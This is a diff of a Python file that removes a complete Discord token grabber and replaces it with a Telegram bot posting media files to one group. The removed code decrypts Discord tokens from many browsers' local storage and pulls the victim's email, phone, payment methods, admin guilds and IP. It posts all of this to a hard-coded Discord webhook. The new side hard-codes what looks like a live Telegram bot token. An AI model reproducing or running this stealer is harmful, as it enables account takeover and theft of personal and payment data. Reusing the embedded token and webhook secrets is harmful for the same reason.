@@ -1,240 +1,187 @@
 import os
+import random
+import shutil
+import logging
+from telegram import Update, InputMediaPhoto
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
-if os.name != "nt":
-    exit()
-import subprocess
-import sys
-import json
-import urllib.request
-import re
-import base64
-import datetime
+# CONFIG
+TOKEN = "8192304202:AAGwNko3yUCVdha7WqDfC2XTDja3WqQof1E"
+MEDIA_FOLDER = "media"
+DONE_FOLDER = "done"
+FAILED_FOLDER = "failed"
+SENT_LOG = "sent_files.txt"
+FAILED_LOG = "failed_files.txt"
+ALLOWED_GROUP_ID = -1002846544658  # Only this group can use the bot
 
+# CONTROL LIMITS
+TOTAL_MEDIA_LIMIT = 25  # /send command (total media)
+PHOTO_LIMIT_SEND = 5    # number of photos in /send
+PHOTO_LIMIT_ONLY = 10   # number of photos in /photos
+PHOTO_ALBUM_SIZE = 5    # number of photos per album
 
-def install_import(modules):
-    for module, pip_name in modules:
-        try:
-            __import__(module)
-        except ImportError:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL,
-                                  stderr=subprocess.DEVNULL)
-            os.execl(sys.executable, sys.executable, *sys.argv)
+# CLEAR TERMINAL
+os.system("cls" if os.name == "nt" else "clear")
 
+def load_sent_files():
+    return set(open(SENT_LOG).read().splitlines()) if os.path.exists(SENT_LOG) else set()
 
-install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+def add_to_log(filename, logfile):
+    with open(logfile, "a") as f:
+        f.write(filename + "\n")
 
-import win32crypt
-from Crypto.Cipher import AES
+def move_file(file, target_folder):
+    os.makedirs(target_folder, exist_ok=True)
+    shutil.move(os.path.join(MEDIA_FOLDER, file), os.path.join(target_folder, file))
 
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-    'Discord': ROAMING + '\\discord',
-    'Discord Canary': ROAMING + '\\discordcanary',
-    'Lightcord': ROAMING + '\\Lightcord',
-    'Discord PTB': ROAMING + '\\discordptb',
-    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
-    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
-    'Amigo': LOCAL + '\\Amigo\\User Data',
-    'Torch': LOCAL + '\\Torch\\User Data',
-    'Kometa': LOCAL + '\\Kometa\\User Data',
-    'Orbitum': LOCAL + '\\Orbitum\\User Data',
-    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
-    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
-    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
-    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
-    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
-    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
-    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
-    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
-    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
-    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
-    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
-}
+def get_media_files():
+    return [f for f in os.listdir(MEDIA_FOLDER) if os.path.isfile(os.path.join(MEDIA_FOLDER, f))]
 
+def separate_files(files):
+    images = [f for f in files if f.lower().endswith((".jpg", ".jpeg", ".png", ".gif"))]
+    videos = [f for f in files if f.lower().endswith((".mp4", ".mkv", ".mov", ".avi"))]
+    return images, videos
 
-def getheaders(token=None):
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
-    }
-
-    if token:
-        headers.update({"Authorization": token})
-
-    return headers
-
-
-def gettokens(path):
-    path += "\\Local Storage\\leveldb\\"
-    tokens = []
-
-    if not os.path.exists(path):
-        return tokens
-
-    for file in os.listdir(path):
-        if not file.endswith(".ldb") and file.endswith(".log"):
-            continue
-
-        try:
-            with open(f"{path}{file}", "r", errors="ignore") as f:
-                for line in (x.strip() for x in f.readlines()):
-                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                        tokens.append(values)
-        except PermissionError:
-            continue
-
-    return tokens
-
-
-def getkey(path):
-    with open(path + f"\\Local State", "r") as file:
-        key = json.loads(file.read())['os_crypt']['encrypted_key']
-        file.close()
-
-    return key
-
-
-def getip():
+async def send_video_file(context: ContextTypes.DEFAULT_TYPE, chat_id, file):
+    filepath = os.path.join(MEDIA_FOLDER, file)
     try:
-        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
-            return json.loads(response.read().decode()).get("ip")
+        with open(filepath, "rb") as media:
+            await context.bot.send_video(chat_id=chat_id, video=media)
+        add_to_log(file, SENT_LOG)
+        move_file(file, DONE_FOLDER)
+        print(f"✅ Sent video: {file}")
+        return True
     except:
-        return "None"
+        add_to_log(file, FAILED_LOG)
+        move_file(file, FAILED_FOLDER)
+        print(f"❌ Failed video: {file}")
+        return False
 
+async def send_photo_album(context: ContextTypes.DEFAULT_TYPE, chat_id, photo_files):
+    album = []
+    sent_count = 0
+    fail_count = 0
+    for file in photo_files:
+        filepath = os.path.join(MEDIA_FOLDER, file)
+        try:
+            with open(filepath, "rb") as img:
+                album.append(InputMediaPhoto(img.read()))
+        except:
+            add_to_log(file, FAILED_LOG)
+            move_file(file, FAILED_FOLDER)
+            print(f"❌ Failed photo: {file}")
+            fail_count += 1
+
+    if album:
+        try:
+            await context.bot.send_media_group(chat_id=chat_id, media=album)
+            for file in photo_files:
+                add_to_log(file, SENT_LOG)
+                move_file(file, DONE_FOLDER)
+                print(f"✅ Sent photo: {file}")
+                sent_count += 1
+        except:
+            for file in photo_files:
+                add_to_log(file, FAILED_LOG)
+                move_file(file, FAILED_FOLDER)
+                print(f"❌ Failed album: {file}")
+                fail_count += 1
+
+    return sent_count, fail_count
+
+async def send_photos_in_albums(context, chat_id, photo_files):
+    total_sent = 0
+    total_failed = 0
+    for i in range(0, len(photo_files), PHOTO_ALBUM_SIZE):
+        batch = photo_files[i:i+PHOTO_ALBUM_SIZE]
+        sent, failed = await send_photo_album(context, chat_id, batch)
+        total_sent += sent
+        total_failed += failed
+    return total_sent, total_failed
+
+async def send_command_message_cleanup(update, context):
+    await update.message.delete()
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.effective_chat or update.effective_chat.id != ALLOWED_GROUP_ID:
+        await update.message.reply_text("⚠️ Access restricted. Join https://t.me/golobackup")
+        return
+    await update.message.reply_text("👋 Welcome! You can now use the media bot.")
+
+async def send_mixed(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.effective_chat or update.effective_chat.id != ALLOWED_GROUP_ID:
+        await update.message.reply_text("⚠️ Access restricted. Join https://t.me/golobackup")
+        return
+
+    await send_command_message_cleanup(update, context)
+
+    chat_id = update.message.chat_id
+    sent_files = load_sent_files()
+    all_files = get_media_files()
+    remaining_files = [f for f in all_files if f not in sent_files]
+    images, videos = separate_files(remaining_files)
+
+    if not images and not videos:
+        await context.bot.send_message(chat_id=chat_id, text="⚠️ No media files available.")
+        return
+
+    num_photos = min(PHOTO_LIMIT_SEND, len(images))
+    num_videos = min(TOTAL_MEDIA_LIMIT - num_photos, len(videos))
+
+    selected_photos = random.sample(images, num_photos)
+    selected_videos = random.sample(videos, num_videos)
+
+    photo_sent, photo_failed = await send_photos_in_albums(context, chat_id, selected_photos)
+
+    video_sent = 0
+    for video in selected_videos:
+        success = await send_video_file(context, chat_id, video)
+        if success:
+            video_sent += 1
+
+    total = photo_sent + video_sent
+    print("\n----- SUMMARY -----")
+    print(f"✅ Photos sent: {photo_sent}")
+    print(f"❌ Photos failed: {photo_failed}")
+    print(f"✅ Videos sent: {video_sent}")
+    print(f"🎯 Total sent: {total}")
+
+    await context.bot.send_message(chat_id=chat_id, text=f"✅ {total} media sent successfully!")
+
+async def send_photos(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.effective_chat or update.effective_chat.id != ALLOWED_GROUP_ID:
+        await update.message.reply_text("⚠️ Access restricted. Join https://t.me/golobackup")
+        return
+
+    await send_command_message_cleanup(update, context)
+
+    chat_id = update.message.chat_id
+    sent_files = load_sent_files()
+    all_files = get_media_files()
+    remaining_files = [f for f in all_files if f not in sent_files]
+    images, _ = separate_files(remaining_files)
+
+    if not images:
+        await context.bot.send_message(chat_id=chat_id, text="⚠️ No images available.")
+        return
+
+    selected_photos = random.sample(images, min(PHOTO_LIMIT_ONLY, len(images)))
+    sent, failed = await send_photos_in_albums(context, chat_id, selected_photos)
+
+    print("\n----- PHOTO SUMMARY -----")
+    print(f"✅ Photos sent: {sent}")
+    print(f"❌ Photos failed: {failed}")
+
+    await context.bot.send_message(chat_id=chat_id, text=f"✅ {sent} photos sent successfully!")
 
 def main():
-    checked = []
+    app = ApplicationBuilder().token(TOKEN).build()
 
-    for platform, path in PATHS.items():
-        if not os.path.exists(path):
-            continue
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("send", send_mixed))
+    app.add_handler(CommandHandler("photos", send_photos))
 
-        for token in gettokens(path):
-            token = token.replace("\\", "") if token.endswith("\\") else token
+    app.run_polling()
 
-            try:
-                token = AES.new(
-                    win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1],
-                    AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(
-                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
-                if token in checked:
-                    continue
-                checked.append(token)
-
-                res = urllib.request.urlopen(
-                    urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
-                if res.getcode() != 200:
-                    continue
-                res_json = json.loads(res.read().decode())
-
-                badges = ""
-                flags = res_json['flags']
-                if flags == 64 or flags == 96:
-                    badges += ":BadgeBravery: "
-                if flags == 128 or flags == 160:
-                    badges += ":BadgeBrilliance: "
-                if flags == 256 or flags == 288:
-                    badges += ":BadgeBalance: "
-
-                params = urllib.parse.urlencode({"with_counts": True})
-                res = json.loads(urllib.request.urlopen(
-                    urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}',
-                                           headers=getheaders(token))).read().decode())
-                guilds = len(res)
-                guild_infos = ""
-
-                for guild in res:
-                    if guild['permissions'] & 8 or guild['permissions'] & 32:
-                        res = json.loads(urllib.request.urlopen(
-                            urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}',
-                                                   headers=getheaders(token))).read().decode())
-                        vanity = ""
-
-                        if res["vanity_url_code"] != None:
-                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
-
-                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
-                if guild_infos == "":
-                    guild_infos = "No guilds"
-
-                res = json.loads(urllib.request.urlopen(
-                    urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions',
-                                           headers=getheaders(token))).read().decode())
-                has_nitro = False
-                has_nitro = bool(len(res) > 0)
-                exp_date = None
-                if has_nitro:
-                    badges += f":BadgeSubscriber: "
-                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"],
-                                                          "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
-
-                res = json.loads(urllib.request.urlopen(
-                    urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
-                                           headers=getheaders(token))).read().decode())
-                available = 0
-                print_boost = ""
-                boost = False
-                for id in res:
-                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
-                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
-                        print_boost += f"ㅤ- Available now\n"
-                        available += 1
-                    else:
-                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
-                    boost = True
-                if boost:
-                    badges += f":BadgeBoost: "
-
-                payment_methods = 0
-                type = ""
-                valid = 0
-                for x in json.loads(urllib.request.urlopen(
-                        urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources',
-                                               headers=getheaders(token))).read().decode()):
-                    if x['type'] == 1:
-                        type += "CreditCard "
-                        if not x['invalid']:
-                            valid += 1
-                        payment_methods += 1
-                    elif x['type'] == 2:
-                        type += "PayPal "
-                        if not x['invalid']:
-                            valid += 1
-                        payment_methods += 1
-
-                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
-                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
-                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
-                embed_user = {
-                    'embeds': [
-                        {
-                            'title': f"**New user data: {res_json['username']}**",
-                            'description': f"""
-                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
-                            'color': 3092790,
-                            'footer': {
-                                'text': "Made by Astraa ・ https://github.com/astraadev"
-                            },
-                            'thumbnail': {
-                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
-                            }
-                        }
-                    ],
-                    "username": "Grabber",
-                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
-                }
-
-                urllib.request.urlopen(
-                    urllib.request.Request('https://discord.com/api/webhooks/1390535310189793390/M_nJ6h2DD_pPembpT0D2ghiyEKQFwMwXojVRxNd2bHlx8zMT6JnDjdVeVDl9GIEJxdkj', data=json.dumps(embed_user).encode('utf-8'),
-                                           headers=getheaders(), method='POST')).read().decode()
-            except urllib.error.HTTPError or json.JSONDecodeError:
-                continue
-            except Exception as e:
-                print(f"ERROR: {e}")
-                continue
-
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
